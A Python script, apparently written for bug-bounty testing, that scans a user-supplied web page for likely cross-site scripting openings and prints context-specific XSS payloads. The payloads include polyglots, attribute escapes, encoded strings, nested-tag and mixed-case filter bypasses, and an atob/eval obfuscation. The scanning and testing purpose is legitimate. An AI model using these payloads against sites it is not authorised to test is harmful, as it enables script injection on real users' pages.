import requests
from bs4 import BeautifulSoup
import re
from urllib.parse import urlparse

def analyze_page(url):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        
        soup = BeautifulSoup(response.text, 'html.parser')
        
        vulnerable_attributes = [
            'onerror', 'onload', 'onclick', 'onmouseover', 'onfocus',
            'onblur', 'onchange', 'onsubmit', 'onkeydown', 'onkeypress'
        ]
        
        # Enhanced form analysis with parameter checking
        forms = soup.find_all('form')
        form_vulnerabilities = []
        for form in forms:
            inputs = form.find_all('input')
            for input_tag in inputs:
                input_type = input_tag.get('type', '').lower()
                if input_type in ['text', 'search', 'email', 'url', 'hidden']:
                    form_vulnerabilities.append({
                        'action': form.get('action', ''),
                        'method': form.get('method', ''),
                        'input_name': input_tag.get('name', ''),
                        'input_type': input_type
                    })
        
        # Enhanced script analysis
        scripts = soup.find_all('script')
        script_vulnerabilities = []
        for script in scripts:
            if script.string:
                dangerous_patterns = ['eval(', 'document.write', 'innerHTML', 
                                   'setTimeout(', 'setInterval(', 'Function(']
                if any(pattern in script.string for pattern in dangerous_patterns):
                    script_vulnerabilities.append({
                        'content': str(script)[:100] + '...'
                    })
        
        # Event handler detection
        event_vulnerabilities = []
        for tag in soup.find_all(True):
            for attr in vulnerable_attributes:
                if tag.get(attr):
                    event_vulnerabilities.append({
                        'tag': tag.name,
                        'attribute': attr,
                        'value': tag.get(attr)
                    })
        
        # Enhanced URL checking
        url_vulnerabilities = []
        for tag in soup.find_all(True):
            for attr in ['href', 'src', 'data', 'action']:
                value = tag.get(attr, '').lower()
                if value and any(proto in value for proto in ['javascript:', 'data:']):
                    url_vulnerabilities.append({
                        'tag': tag.name,
                        'attribute': attr,
                        'value': value
                    })
        
        return {
            'forms': form_vulnerabilities,
            'scripts': script_vulnerabilities,
            'events': event_vulnerabilities,
            'urls': url_vulnerabilities
        }

    except Exception as e:
        return {'error': str(e)}

# Enhanced payload generation incorporating BitPanic techniques
def get_xss_payloads(context='generic'):
    base_payloads = [
        # Basic polyglot from article
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */onerror=alert(1)//',
        
        # Attribute escape techniques
        '"\'><script>alert(1)</script>',
        '" onfocus=alert(1) autofocus ',
        
        # Context-specific payloads
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        
        # Obfuscation techniques from article
        '<scr<script>ipt>alert(1)</scr<script>ipt>',
        'javascript:alert(1)//http://fake.com',
        
        # Encoded payloads
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
        
        # Advanced bypasses
        '<dETAILS/+/onpoinTeRovEr=alert(1)>',
        '<a href="javas&#99;ript:alert(1)">click'
    ]
    
    # Context-specific payload generation
    if context == 'attribute':
        return [
            '" onmouseover="alert(1)"',
            '" autofocus onfocus="alert(1)"',
            '"><script>alert(1)</script>',
            '"`><svg/onload=alert(1)>'
        ]
    elif context == 'script':
        return [
            'alert(1)//',
            '*/alert(1)/*',
            '];alert(1);//',
            'eval(atob("YWxlcnQoMSk="))'
        ]
    elif context == 'url':
        return [
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'javascript://%0aalert(1)',
            'javascrip\\t:alert(1)'
        ]
    
    return base_payloads

def main():
    target_url = target_url = input("Enter url:")
    #Sources:
    #"https://medium.com/@saltify/from-alert-1-to-account-takeover-a-story-of-4-digit-bounties-and-bypassing-html-sanitisers-dd8ca0ac502b"
    #"https://bitpanic.medium.com/payload-generation-techniques-for-bug-bounty-hunters-ab8b75bdffa6"
    print(f"Analyzing: {target_url}")
    results = analyze_page(target_url)
    
    if 'error' in results:
        print(f"Error: {results['error']}")
        return
    
    print("\nPotential Vulnerabilities Found:")
    
    if results['forms']:
        print("\nForm Inputs:")
        for form in results['forms']:
            print(f"- Action: {form['action']}, Method: {form['method']}, "
                  f"Input: {form['input_name']} ({form['input_type']})")
    
    if results['scripts']:
        print("\nScript Issues:")
        for script in results['scripts']:
            print(f"- Suspicious script content: {script['content']}")
    
    if results['events']:
        print("\nEvent Handlers:")
        for event in results['events']:
            print(f"- Tag: {event['tag']}, Attribute: {event['attribute']}, "
                  f"Value: {event['value']}")
    
    if results['urls']:
        print("\nSuspicious URLs:")
        for url in results['urls']:
            print(f"- Tag: {url['tag']}, Attribute: {url['attribute']}, "
                  f"Value: {url['value']}")
    
    # Context-aware payload suggestions
    print("\nSuggested XSS Payloads:")
    print("\nGeneric Payloads:")
    for payload in get_xss_payloads('generic'):
        print(f"- {payload}")
    
    if results['forms'] or results['events']:
        print("\nAttribute Context Payloads:")
        for payload in get_xss_payloads('attribute'):
            print(f"- {payload}")
    
    if results['scripts']:
        print("\nScript Context Payloads:")
        for payload in get_xss_payloads('script'):
            print(f"- {payload}")
    
    if results['urls']:
        print("\nURL Context Payloads:")
        for payload in get_xss_payloads('url'):
            print(f"- {payload}")

if __name__ == "__main__":
    main()
